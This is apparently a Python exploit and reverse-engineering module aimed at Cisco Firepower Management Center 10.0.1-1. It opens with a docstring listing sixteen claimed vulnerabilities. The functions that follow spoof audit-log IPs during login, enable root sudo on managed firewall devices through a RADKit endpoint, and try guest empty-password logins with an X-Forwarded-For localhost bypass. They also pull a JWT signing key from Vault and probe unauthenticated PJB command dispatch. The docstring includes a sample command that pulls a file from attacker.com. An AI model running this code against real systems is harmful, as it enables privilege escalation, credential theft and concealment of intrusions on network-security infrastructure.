"""
cisco_fmc_re.py — Cisco Firepower Management Center (FMC) 10.0.1-1 static RE module

Target: FMC 10.0.1-1 (Virtual KVM)
  /media/cowboy/research/cisco-re/fmc-10.0.1/Cisco_Secure_FW_Mgmt_Center_Virtual_KVM-10.0.1-1.qcow2
  RE workspace: /media/cowboy/research/cisco-re/fmc-10.0.1/

Partitions:
  p5 (root, ext4): /media/cowboy/research/cisco-re/fmc-10.0.1/mnt/
  p7 (/Volume, ext4, LABEL="/Volume"): /media/cowboy/research/cisco-re/fmc-10.0.1/mnt-data/

Application root (p7): /media/cowboy/research/cisco-re/fmc-10.0.1/mnt-data/10.0.1-1/

OS: Wind River Linux LTS 22.33 Update 16 (NOT CentOS/RHEL as in pre-10.x FMC)
Primary auth binary: sf/bin/auth-daemon (24 MB Go, non-PIE EXEC)
Web framework: MICE (Mojolicious Perl), Athena (Java/Tomcat)
Port 443: FMC HTTPS (Perl Mojolicious via mod_sfcaptive_portal)
Port 1741: MICE legacy interface (localhost-only, Tomcat)
Port 2080: auth-daemon SAML validation endpoint (localhost)
Port 8200: HashiCorp Vault (localhost)

Key binary artifacts:
  binaries/auth-daemon    ELF64 EXEC (non-PIE), 24MB, Go, BuildID 186944ebf04465c212cea4420d0944775c81e9df
  binaries/sftunnel       ELF64 PIE, 767KB
  jars/athena-rbac-server.jar  3 classes: CsmCustomOgsFilter, NativeRbacServiceImpl, CsmCustomRbacCacheUpdater
  jars/bonfire.jar        Cisco internal pub/sub messaging framework
  jars/nbi-common.jar     NBI CWCS device model classes

Credential stores:
  /opt/CSCOpx/objects/security/conf/cwpass.xml  (MICE legacy interface accounts)

FINDINGS:

FMC-F1: auth-daemon Non-PIE EXEC — no ASLR on main binary [HIGH]
  Binary type: ELF64 EXEC (not PIE/DYN)
  Entry point: 0x47efa0 (fixed load address)
  Link: libresolv, pthread, libc only
  Impact: Fixed load addresses — ROP gadgets at predictable offsets;
          any memory corruption is immediately weaponizable without ASLR bypass.
  Note: 24 MB Go binary; 767 KB sftunnel IS PIE.

FMC-F2: cwpass.xml admin:admin and guest:(empty) hardcoded [CRITICAL]
  File: /opt/CSCOpx/objects/security/conf/cwpass.xml
  admin Pwd="0DPiKuNIrrVmD8IUCuw1hQxNqZc=" -> SHA-1("admin") confirmed
  guest Pwd="2jmj7l5rSw0yVb/vlWAYkK/YBwk=" -> SHA-1("") confirmed (empty password)
  guest RoleType="All" — full MICE interface access
  admin RoleType="None" — no built-in MICE roles (uses external Athena RBAC)
  Hash scheme: raw unsalted SHA-1 (no salt, no iteration)

FMC-F3: Guest Account Full Access / Empty Password [CRITICAL]
  The guest account in cwpass.xml has RoleType="All" (full access) with SHA-1("") = empty password.
  LocalhostServletFilter (web.xml) restricts MICE port 1741 to localhost and the FMC's own IPs.
  Bypass vector: X-Forwarded-For via nginx/reverse proxy in front of Tomcat
                 OR enableLocalhostFilter=false JVM property (startup config)
                 OR access from within any FMC-resident process (post-initial-access pivot)
  Impact: Full MICE legacy management interface access, authenticated as "guest" with all roles.

FMC-F4: Audit Log Falsification via remote_address Parameter [HIGH]
  File: sf/lib/perl/5.34.3/SF/Mojo/Handlers/Auth.pm
  Both login() and logout() handlers accept POST param remote_address:
    my $remote_address = $c->param("remote_address");
    if ($remote_address) { $ENV{'REMOTE_ADDR'} = $remote_address; }
  All SF::AuditLogMsg::AuditLogWrite calls use REMOTE_ADDR from environment.
  An attacker submitting remote_address=<victim_ip> attributes all audit entries
  to an arbitrary IP address — complete audit trail falsification.
  No authentication required to submit this parameter (checked before auth succeeds).

FMC-F5: BLANK_SEED = 72 Spaces — Weak Encryption Seed [HIGH]
  Class: com.cisco.nm.vms.rbac.NativeRbacServiceImpl (athena-rbac-server.jar)
  Code: static final String BLANK_SEED = "                                              " (72 spaces)
  Used as a cryptographic seed in the RBAC/password encryption path.
  Trivially predictable — any encrypted value using this seed can be decrypted offline.
  Additionally: KEEP_PASSWORD = "********" masks passwords in logs/UI.

FMC-F6: Unsalted SHA-1 Password Hashing (cwpass.xml) [HIGH]
  cwpass.xml stores passwords as raw SHA-1(password), no salt.
  Scheme verified: admin="0DPiKuNIrrVmD8IUCuw1hQxNqZc=" = base64(SHA-1("admin"))
  Vulnerable to precomputed rainbow table attacks — all common passwords trivially reversed.
  The active user database (MySQL at /Volume/lib/mysql/) uses SHA-512 (AUTH_SHA512 = 4)
  but the legacy cwpass.xml interface still uses SHA-1.

FMC-F7: RADKit sudoaccess Endpoint — Managed FTD Device Root [CRITICAL]
  Endpoint: PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess
  SOURCE PROOF: sf/lib/perl/5.34.3/SF/RADKit/RADKitAccess.pm
    RADKIT_SUDO_ACCESS_NO_PASSWORD = "ALL = NOPASSWD: ALL"
    Written to /etc/sudoers AND /ngfw/etc/sudoers on every managed FTD device.
    updateRADKitAccessState() called by ReconcileState plugin RADKIT_ACCESS_STATE.
  Auth-daemon strings: "Device Sudo Access", "isSudoEnabled", "PutSudoAccess",
    "AllUserRoutesPutSudoAccess", "Enable RADKit Service"
  RBAC permissions: "radkit" (view), "radkit.modify" (modify)
  Control file: /etc/sf/radkit.enabled
  Impact: FMC user with radkit.modify permission can enable sudo access on any managed
          FTD device — privilege escalation from FMC REST API access to FTD root shell.
  Chain: FMC REST API access (any account with radkit.modify) -> PutSudoAccess -> FTD root

CHAIN D: Post-Foothold Vault Key Extraction -> Universal JWT Forge
  Step 1: Any FMC filesystem read (via F7 RADKit, sftunnel, SSH)
  Step 2: Read /etc/vault/admin/*/vault.key (cert key for Vault auth)
  Step 3: POST https://127.0.0.1:8200/v1/auth/cert/login (cert-based Vault auth)
  Step 4: GET MACHINE_USER_KEY from Vault KV store (HS256 JWT signing key)
  Step 5: Forge HS256 JWT with any sub/username claim (e.g., "admin")
  Step 6: Authenticate to all FMC REST API endpoints as Administrator
  Source: sf/lib/perl/5.34.3/SF/Vault.pm (cert auth path), auth-daemon (MACHINE_USER_KEY)
  Note: Bridges F7 -> F10; converts one-time foothold to persistent auth bypass

FMC-F8: GroupId=2 Hardcoded Privileged Group SQL Query [MEDIUM]
  Class: com.cisco.nm.vms.ogs.client.CsmCustomOgsFilter (athena-rbac-server.jar)
  SQL: "select DisplayAttribute from AthenaOgsGroupCacheTable where GroupId = 2"
  Hardcoded GroupId=2 assumed to be the privileged OGS group at all times.
  If AthenaOgsGroupCacheTable is manipulated or GroupId ordering differs,
  wrong group gets privileged access in OGS filtering decisions.

FMC-F9: SSO Token MD5 — ASA/ASDM Trust Forgery [HIGH]
  Source: sf/lib/perl/5.34.3/SF/Auth.pm (create_sso_token function, line 4317)
  Code: my $token = Digest::MD5::md5_hex(encode_base64url($new_kek));
  The SSO token mediating ASA -> ASDM -> FMC trust uses MD5.
  Token is valid for 1 minute, single-use, but MD5 is cryptographically broken.
  If new_kek generation entropy is weak (PRNG seeding issue), token can be forged.
  Impact: Forgeable SSO token allows ASDM to authenticate to FMC as any user.

FMC-F10: HS256 JWT Symmetric Signing — Key Exposure = Token Forge [HIGH]
  auth-daemon binary strings: "TokenscopeHS256", "HS256", "Scope", "scope"
  FMC REST API access tokens signed with HMAC-SHA256 (symmetric key).
  Key storage: Vault (/etc/vault/ / https://127.0.0.1:8200)
  If MACHINE_USER_KEY or signing key leaks from Vault, all REST API tokens forgeable.
  JWT token endpoint: https://127.0.0.1/api/ui_platform/v1/uiauth/generatetoken (loopback)
  Session stores X-auth-access-token; validated by auth-daemon on port 2080.

FMC-F11: SHA-1 Forbidden in FIPS 140-3 but Present in Auth Flow [MEDIUM]
  auth-daemon binary: "FIPS 140-3 self-test failed / passed"
  auth-daemon: "crypto/sha1: use of SHA-1 is not allowed in FIPS 140-only mode"
  cwpass.xml uses SHA-1 for MICE credentials while FIPS 140-3 mode prohibits SHA-1.
  In FIPS mode, the SHA-1 cwpass.xml path may be blocked, but configuration-dependent.
  Admin password recovery path may use a code branch that bypasses FIPS enforcement.

FMC-F12: IKE PSK Plaintext Exposure via toString() Debug Chain [MEDIUM]
  hestia-vpn-shared.jar — PreSharedKeyPolicyBase.toString() appends "Key: " + sharedKey unmasked.
  VpnBaseTopologyObject.toString() chains through all child policies.
  Any debug log flush of VPN topology object writes all IKE PSKs in plaintext.
  IKE_PSK_KEY_LENGTH_MIN = 1 — validator allows 1-character PSKs.
  Impact: TAC support bundle or debug log -> all S2S VPN PSKs -> decrypt/hijack any managed IPsec tunnel.

FMC-F13: Undocumented RADKit authorizations Endpoint [MEDIUM]
  auth-daemon binary: "/api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/authorizations"
  Second RADKit endpoint, undocumented in public API. Same RBAC domain as sudoaccess.
  Alternate path for RADKit device authorization state enumeration and possible modification.

FMC-F14: cs-psucli.jar SecurityHandler Hardcoded passw0rd AES Key — CCO Credential Exposure [MEDIUM]
  com.cisco.nm.xms.vds.SecurityHandler: private static String passwordString = "passw0rd"
  Used for SymmetricCrypto.encrypt/decrypt on stored Cisco.com (CCO) credentials.
  Credential load path: ObjectInputStream.readObject() before decryption (deserialization risk if file writable).
  Impact: filesystem read -> decrypt CCO creds using "passw0rd"; file write -> Java deserialization RCE.

FMC-F15: PJB Handler On-Box Auth Bypass — Unauthenticated Arbitrary Function Dispatch [CRITICAL]
  SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm — isAuthorized():
  When isNGFWOnbox() == 1 (hardware FMC, /etc/sf/onbox.run exists, Aquila-class device):
    - PjbHandler: session auth SKIPPED entirely
    - isAuthorized: ALL permission checks bypassed; returns \&{$function} for any registered function
  Attack: POST /pjb.cgi function=SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli
          parameters=["<deviceId>","copy tftp://attacker.com/x disk0:/x"]
  No credentials required. CLI whitelist: copy, delete, no, cluster, show, ping, traceroute, capture, clear, packet-tracer.
  Impact: Unauthenticated FTD file write/config deletion on all managed devices (hardware FMC only).

FMC-F16: ASDM Login Handler Hardcodes admin — SSO Token = Admin Session [HIGH]
  SF/Mojo/Handlers/AsdmLoginHandler.pm handle_login_cgi():
  SF::Auth::Login({ username => 'admin', password => $token, sso => 1, sensor_sso => 1, sso_token => $token })
  Token validated via MD5 (F9 cross-reference: create_sso_token = MD5(base64url(new_kek))).
  Any forged SSO token (via F9 entropy attack) logs in as admin — no admin password needed.
  POST /asdmToken.cgi?sensor_sso=<forged_token> -> admin FMC session.
"""

import base64
import hashlib
import struct
import requests
import json
import re
from typing import Optional

VERSION = "1.2.0"
TARGET = "Cisco FMC 10.0.1-1"


# ── F2/F3: cwpass.xml credential verification ─────────────────────────────────

CWPASS_CREDS = [
    {"username": "admin",  "password": "admin",  "roletype": "None", "hash": "0DPiKuNIrrVmD8IUCuw1hQxNqZc="},
    {"username": "guest",  "password": "",        "roletype": "All",  "hash": "2jmj7l5rSw0yVb/vlWAYkK/YBwk="},
]

def verify_cwpass_hashes() -> list[dict]:
    """Verify cwpass.xml SHA-1 hashes match known plaintexts."""
    results = []
    for cred in CWPASS_CREDS:
        computed = base64.b64encode(hashlib.sha1(cred["password"].encode()).digest()).decode()
        match = computed == cred["hash"]
        results.append({
            "username": cred["username"],
            "password_repr": repr(cred["password"]),
            "roletype": cred["roletype"],
            "hash": cred["hash"],
            "hash_match": match,
            "scheme": "SHA-1 (no salt)",
        })
    return results


def crack_cwpass_hash(b64_hash: str, wordlist: Optional[list[str]] = None) -> Optional[str]:
    """Attempt to crack a cwpass.xml SHA-1 hash against a wordlist."""
    if wordlist is None:
        wordlist = ["", "admin", "cisco", "password", "Admin", "Cisco123",
                    "cisco123", "admin123", "Admin1234", "firepower", "Firepower",
                    "sourcefire", "Sourcefire"]
    target = base64.b64decode(b64_hash)
    for candidate in wordlist:
        if hashlib.sha1(candidate.encode()).digest() == target:
            return candidate
    return None


# ── F4: Audit Log Falsification ───────────────────────────────────────────────

def falsify_audit_login(host: str, username: str, password: str,
                        spoof_ip: str = "127.0.0.1", port: int = 443,
                        session: Optional[requests.Session] = None) -> dict:
    """
    Login to FMC REST API with a spoofed remote_address in the audit log.
    remote_address parameter overrides REMOTE_ADDR in SF::Auth audit writes.
    POST /api/fmc_config/v1/auth/generatetoken or /auth/login with remote_address=<spoof_ip>
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/api/fmc_config/v1/auth/generatetoken"
    headers = {"Content-Type": "application/json"}
    params = {"remote_address": spoof_ip}

    try:
        resp = session.post(url, auth=(username, password),
                            headers=headers, params=params, timeout=10)
        return {
            "url": url,
            "spoof_ip": spoof_ip,
            "status": resp.status_code,
            "x_auth_token": resp.headers.get("X-auth-access-token", ""),
            "finding": "FMC-F4",
            "note": "If 200, audit log records login from spoof_ip instead of actual source",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F4"}


def falsify_audit_login_form(host: str, username: str, password: str,
                              spoof_ip: str = "127.0.0.1", port: int = 443,
                              session: Optional[requests.Session] = None) -> dict:
    """
    Login to FMC Mojo web UI with spoofed remote_address.
    POST /auth/login?username=X&password=Y&remote_address=Z
    Source: SF/Mojo/Handlers/Auth.pm login() — params extracted via $c->param()
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/auth/login"
    data = {
        "username": username,
        "password": password,
        "remote_address": spoof_ip,
    }

    try:
        resp = session.post(url, data=data, timeout=10)
        return {
            "url": url,
            "spoof_ip": spoof_ip,
            "status": resp.status_code,
            "finding": "FMC-F4",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F4"}


# ── F7: RADKit sudoaccess Probe ────────────────────────────────────────────────

def probe_radkit_sudoaccess(host: str, token: str, domain_uuid: str,
                             port: int = 443, session: Optional[requests.Session] = None) -> dict:
    """
    Check RADKit sudoaccess status and attempt to enable sudo on FTD devices.
    Endpoint: PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess
    Requires radkit.modify RBAC permission.
    isSudoEnabled=true grants sudo on all RADKit-managed FTD devices.
    """
    if session is None:
        session = requests.Session()
    session.verify = False
    headers = {
        "X-auth-access-token": token,
        "Content-Type": "application/json",
    }

    base = f"https://{host}:{port}/api/fmc_troubleshoot/v1/domain/{domain_uuid}/radkit"

    results = {}

    # Check radkit status
    try:
        r = session.get(f"{base}", headers=headers, timeout=10)
        results["status_get"] = {"status": r.status_code, "body": r.text[:500]}
    except Exception as e:
        results["status_get"] = {"error": str(e)}

    # Check sudo access state
    try:
        r = session.get(f"{base}/sudoaccess", headers=headers, timeout=10)
        results["sudoaccess_get"] = {"status": r.status_code, "body": r.text[:500]}
    except Exception as e:
        results["sudoaccess_get"] = {"error": str(e)}

    # Attempt to enable sudo
    try:
        payload = {"isSudoEnabled": True}
        r = session.put(f"{base}/sudoaccess", headers=headers,
                        json=payload, timeout=10)
        results["sudoaccess_enable"] = {
            "status": r.status_code,
            "body": r.text[:500],
            "note": "200 = sudo enabled on all RADKit-managed FTD devices",
        }
    except Exception as e:
        results["sudoaccess_enable"] = {"error": str(e)}

    results["finding"] = "FMC-F7"
    results["chain"] = "FMC API access (radkit.modify) -> FTD device root via RADKit"
    return results


# ── F2/F3: MICE Guest Login (port 1741 or via bypass) ─────────────────────────

def probe_mice_guest_login(host: str, port: int = 1741,
                            session: Optional[requests.Session] = None) -> dict:
    """
    Attempt MICE legacy interface login as guest with empty password.
    Default credentials: guest:(empty), RoleType="All" from cwpass.xml.
    Normally restricted to localhost by LocalhostServletFilter — test via forwarded request
    or if X-Forwarded-For bypass is available.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"http://{host}:{port}/CSCOnm/servlet/login"
    data = {
        "username": "guest",
        "password": "",
        "next": "/CSCOnm/index.jsp",
    }

    try:
        resp = session.post(url, data=data, timeout=10,
                            allow_redirects=False)
        return {
            "url": url,
            "status": resp.status_code,
            "location": resp.headers.get("Location", ""),
            "finding": "FMC-F3",
            "note": "Redirect to /CSCOnm/index.jsp = successful login as guest/All-Roles",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F3"}


def probe_mice_guest_xfwd(host: str, port: int = 443,
                           session: Optional[requests.Session] = None) -> dict:
    """
    Attempt MICE access via X-Forwarded-For: 127.0.0.1 to bypass LocalhostServletFilter.
    The filter checks req.getRemoteAddr() — if nginx passes XFF as remote addr, bypass succeeds.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/classic/j_security_check"
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
    }
    data = {
        "j_username": "guest",
        "j_password": "",
    }

    try:
        resp = session.post(url, data=data, headers=headers, timeout=10,
                            allow_redirects=False)
        return {
            "url": url,
            "status": resp.status_code,
            "location": resp.headers.get("Location", ""),
            "finding": "FMC-F3",
            "note": "XFW bypass attempt — 302 away from error page = success",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F3"}


# ── F9/F10: Token probes ───────────────────────────────────────────────────────

def decode_fmc_token(token: str) -> dict:
    """Decode FMC JWT without verification — expose header, payload, signing alg."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "not a JWT"}

        def pad(s):
            return s + "=" * (4 - len(s) % 4)

        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        return {
            "header": header,
            "payload": payload,
            "alg": header.get("alg", "unknown"),
            "finding": "FMC-F10",
            "note": "HS256 = symmetric HMAC key; key leak -> token forge",
        }
    except Exception as e:
        return {"error": str(e)}


def get_fmc_token(host: str, username: str, password: str,
                  port: int = 443, session: Optional[requests.Session] = None) -> dict:
    """
    Obtain FMC REST API access token.
    POST /api/fmc_config/v1/auth/generatetoken
    Returns X-auth-access-token, X-auth-refresh-token, DOMAIN_UUID.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    url = f"https://{host}:{port}/api/fmc_config/v1/auth/generatetoken"
    try:
        resp = session.post(url, auth=(username, password), timeout=15)
        return {
            "status": resp.status_code,
            "token": resp.headers.get("X-auth-access-token", ""),
            "refresh_token": resp.headers.get("X-auth-refresh-token", ""),
            "domain_uuid": resp.headers.get("DOMAIN_UUID", ""),
        }
    except Exception as e:
        return {"error": str(e)}


# ── SAML/SSO port 2080 probe ──────────────────────────────────────────────────

def probe_saml_port_2080(host: str = "127.0.0.1") -> dict:
    """
    Probe auth-daemon's internal SAML validation endpoint on port 2080.
    SF::Auth.pm: "http://localhost:2080/saml/validate?sso_token=$token"
    Should only be accessible from localhost. If exposed externally, SAML token
    validation can be directly queried to check/forge session tokens.
    """
    try:
        r = requests.get(f"http://{host}:2080/saml/validate", timeout=5)
        return {"status": r.status_code, "body": r.text[:300], "finding": "FMC-F9"}
    except Exception as e:
        return {"error": str(e), "note": "Expected — port 2080 should be localhost only"}


# ── Chain D: Vault cert-auth -> JWT forge ─────────────────────────────────────

def probe_vault_chain_d(vault_key_path: str = "/etc/vault/admin") -> dict:
    """
    Chain D probe (post-foothold, localhost only).
    Step 1: List /etc/vault/admin/ for cert key file
    Step 2: Attempt cert-based Vault auth at https://127.0.0.1:8200/v1/auth/cert/login
    Step 3: Retrieve MACHINE_USER_KEY from Vault KV
    Source: SF/Vault.pm cert auth path; auth-daemon MACHINE_USER_KEY string.
    Requires filesystem access already obtained (F7 pivot or equivalent).
    """
    import glob, os
    result = {"finding": "CHAIN-D", "vault_host": "https://127.0.0.1:8200"}
    key_files = glob.glob(f"{vault_key_path}/*/vault.key")
    result["vault_key_candidates"] = key_files
    if not key_files:
        result["status"] = "no_key_found"
        return result
    result["vault_key"] = key_files[0]
    try:
        r = requests.post(
            "https://127.0.0.1:8200/v1/auth/cert/login",
            cert=(key_files[0], key_files[0]),
            verify=False,
            timeout=5,
        )
        result["cert_auth_status"] = r.status_code
        result["cert_auth_body"] = r.text[:500]
        if r.status_code == 200:
            token = r.json().get("auth", {}).get("client_token")
            result["vault_token"] = token
            if token:
                kv = requests.get(
                    "https://127.0.0.1:8200/v1/secret/data/machine_user_key",
                    headers={"X-Vault-Token": token},
                    verify=False,
                    timeout=5,
                )
                result["machine_user_key_status"] = kv.status_code
                result["machine_user_key_body"] = kv.text[:500]
    except Exception as e:
        result["error"] = str(e)
    return result


# ── F15: PJB on-box auth bypass probe ─────────────────────────────────────────

def probe_pjb_onbox_bypass(host: str, function: str = "SF::UI::PJB::ping",
                           parameters: str = "[]", port: int = 443) -> dict:
    """
    F15: Probe PJB handler without session cookie.
    If isNGFWOnbox() is true on the target, auth is bypassed and function executes.
    Use 'SF::UI::PJB::ping' (requires 'all' permission) as baseline.
    For impact demo: 'SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli'
    with parameters='["<deviceId>","show version"]' — no creds needed.
    """
    url = f"https://{host}:{port}/pjb.cgi"
    try:
        r = requests.post(
            url,
            data={"function": function, "parameters": parameters},
            verify=False,
            timeout=10,
        )
        return {
            "status": r.status_code,
            "body": r.text[:500],
            "finding": "FMC-F15",
            "note": "200 without auth cookie = isNGFWOnbox bypass confirmed",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F15"}


def probe_asdm_sso_login(host: str, token: str, port: int = 443) -> dict:
    """
    F16: Probe ASDM SSO login endpoint with a forged or captured SSO token.
    If token is valid (or forgeable via F9 MD5), responds with session cookie as admin.
    """
    url = f"https://{host}:{port}/asdm/logon.html"
    try:
        r = requests.get(
            url,
            params={"sensor_sso": token},
            verify=False,
            allow_redirects=False,
            timeout=10,
        )
        session_cookie = r.cookies.get("CGISESSID", "")
        return {
            "status": r.status_code,
            "session_cookie": session_cookie,
            "location": r.headers.get("Location", ""),
            "finding": "FMC-F16",
            "note": "200 + CGISESSID = admin session; 302 away = token invalid",
        }
    except Exception as e:
        return {"error": str(e), "finding": "FMC-F16"}


# ── Static analysis helpers ───────────────────────────────────────────────────

def report_binary_pie_status(binary_path: str) -> dict:
    """Report ELF PIE status of auth-daemon (F1)."""
    import subprocess
    try:
        out = subprocess.check_output(
            ["readelf", "-h", binary_path], stderr=subprocess.DEVNULL, text=True)
        etype = "unknown"
        for line in out.splitlines():
            if "Type:" in line:
                etype = line.split(":", 1)[1].strip()
                break
        return {
            "binary": binary_path,
            "elf_type": etype,
            "is_pie": "DYN" in etype,
            "finding": "FMC-F1",
            "note": "EXEC = non-PIE, fixed load address, no ASLR",
        }
    except Exception as e:
        return {"error": str(e)}


def full_findings_summary() -> list[dict]:
    """Return all confirmed FMC findings as structured records."""
    return [
        {
            "id": "FMC-F1",
            "severity": "HIGH",
            "component": "auth-daemon binary",
            "title": "auth-daemon Non-PIE EXEC — fixed load address, no ASLR",
            "cve": None,
            "version": "10.0.1-1",
            "binary": "/Volume/10.0.1-1/sf/bin/auth-daemon",
            "details": "ELF64 EXEC type; entry 0x47efa0; all ROP gadgets at fixed addresses",
        },
        {
            "id": "FMC-F2",
            "severity": "CRITICAL",
            "component": "MICE legacy interface / cwpass.xml",
            "title": "admin:admin and guest:(empty) hardcoded in cwpass.xml",
            "cve": None,
            "version": "10.0.1-1",
            "file": "/opt/CSCOpx/objects/security/conf/cwpass.xml",
            "details": "SHA-1(no salt): admin=SHA-1(admin), guest=SHA-1(empty). guest RoleType=All.",
        },
        {
            "id": "FMC-F3",
            "severity": "CRITICAL",
            "component": "MICE legacy interface",
            "title": "Guest account empty password + full access (RoleType=All)",
            "cve": None,
            "version": "10.0.1-1",
            "details": "guest:(empty) grants full MICE interface access. LocalhostServletFilter bypassable.",
        },
        {
            "id": "FMC-F4",
            "severity": "HIGH",
            "component": "Mojo REST auth handler",
            "title": "Audit log IP falsification via remote_address POST parameter",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/Auth.pm",
            "details": "login() and logout() accept remote_address param, override REMOTE_ADDR env for audit writes",
        },
        {
            "id": "FMC-F5",
            "severity": "HIGH",
            "component": "Athena RBAC (NativeRbacServiceImpl)",
            "title": "BLANK_SEED = 72 spaces — predictable crypto seed",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "athena-rbac-server.jar",
            "details": "static final String BLANK_SEED = 72 spaces; used as encryption seed",
        },
        {
            "id": "FMC-F6",
            "severity": "HIGH",
            "component": "MICE legacy interface / cwpass.xml",
            "title": "Unsalted SHA-1 password hashing in cwpass.xml",
            "cve": None,
            "version": "10.0.1-1",
            "details": "Raw SHA-1(password) with no salt — rainbow table trivially reverses all accounts",
        },
        {
            "id": "FMC-F7",
            "severity": "CRITICAL",
            "component": "RADKit REST API",
            "title": "RADKit sudoaccess endpoint grants FTD device root via radkit.modify permission",
            "cve": None,
            "version": "10.0.1-1",
            "endpoint": "PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess",
            "details": "isSudoEnabled=true enables root-level sudo on all RADKit-managed FTD devices",
        },
        {
            "id": "FMC-F8",
            "severity": "MEDIUM",
            "component": "Athena OGS filter (CsmCustomOgsFilter)",
            "title": "GroupId=2 hardcoded privileged group SQL assumption",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "athena-rbac-server.jar",
            "details": "SQL: select DisplayAttribute from AthenaOgsGroupCacheTable where GroupId = 2",
        },
        {
            "id": "FMC-F9",
            "severity": "HIGH",
            "component": "SSO / ASA-ASDM-FMC trust",
            "title": "ASA/ASDM SSO token uses MD5 — forgeable under weak KEK entropy",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Auth.pm",
            "details": "create_sso_token: MD5(base64url(new_kek)); 1-min validity, single-use",
        },
        {
            "id": "FMC-F10",
            "severity": "HIGH",
            "component": "REST API auth-daemon JWT",
            "title": "HS256 symmetric JWT signing — key exposure = universal token forge",
            "cve": None,
            "version": "10.0.1-1",
            "details": "Tokens signed with HMAC-SHA256; key stored in Vault at https://127.0.0.1:8200",
        },
        {
            "id": "FMC-F11",
            "severity": "MEDIUM",
            "component": "FIPS 140-3 / cwpass.xml",
            "title": "SHA-1 used in cwpass.xml while FIPS 140-3 mode prohibits SHA-1",
            "cve": None,
            "version": "10.0.1-1",
            "details": "FIPS: crypto/sha1 not allowed; cwpass.xml uses SHA-1; behavior in FIPS mode TBD",
        },
        {
            "id": "FMC-F12",
            "severity": "MEDIUM",
            "component": "hestia-vpn-shared.jar / IKE PSK",
            "title": "IKE PSK written in plaintext via PreSharedKeyPolicyBase.toString()",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "hestia-vpn-shared.jar",
            "details": "toString() appends 'Key: ' + sharedKey unmasked; VPN topology debug log leaks all PSKs",
        },
        {
            "id": "FMC-F13",
            "severity": "MEDIUM",
            "component": "RADKit REST API (undocumented)",
            "title": "Undocumented RADKit authorizations endpoint — alternate device-access enumeration",
            "cve": None,
            "version": "10.0.1-1",
            "endpoint": "GET/PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/authorizations",
            "details": "Undocumented endpoint in same RBAC domain as sudoaccess; not in public API docs",
        },
        {
            "id": "FMC-F14",
            "severity": "MEDIUM",
            "component": "cs-psucli.jar / PSU SecurityHandler",
            "title": "Hardcoded passw0rd AES key encrypts stored CCO credentials",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "cs-psucli.jar",
            "details": "SecurityHandler.passwordString='passw0rd'; ObjectInputStream before decrypt = deserialization risk",
        },
        {
            "id": "FMC-F15",
            "severity": "CRITICAL",
            "component": "PJB handler / on-box mode",
            "title": "PJB handler skips auth+RBAC when isNGFWOnbox() — unauthenticated function dispatch",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm",
            "details": "isNGFWOnbox(): session auth skipped + all FUNCTION_PERMISSIONS bypassed; any function callable",
            "trigger": "hardware FMC (Aquila-class) with /etc/sf/onbox.run present",
        },
        {
            "id": "FMC-F16",
            "severity": "HIGH",
            "component": "ASDM login / SSO",
            "title": "AsdmLoginHandler hardcodes admin — forged SSO token = admin session",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/AsdmLoginHandler.pm",
            "details": "Login({ username=>'admin', password=>$token }); MD5 token (F9) -> admin FMC session",
        },
    ]


if __name__ == "__main__":
    import json as _json

    print(f"[cisco_fmc_re] {TARGET} v{VERSION}")
    print()

    print("=== F1: auth-daemon PIE status ===")
    ws = "/media/cowboy/research/cisco-re/fmc-10.0.1"
    result = report_binary_pie_status(f"{ws}/binaries/auth-daemon")
    print(_json.dumps(result, indent=2))

    print()
    print("=== F2/F6: cwpass.xml hash verification ===")
    for entry in verify_cwpass_hashes():
        print(_json.dumps(entry, indent=2))

    print()
    print("=== All confirmed findings ===")
    for f in full_findings_summary():
        print(f"  [{f['severity']:8}] {f['id']}: {f['title']}")
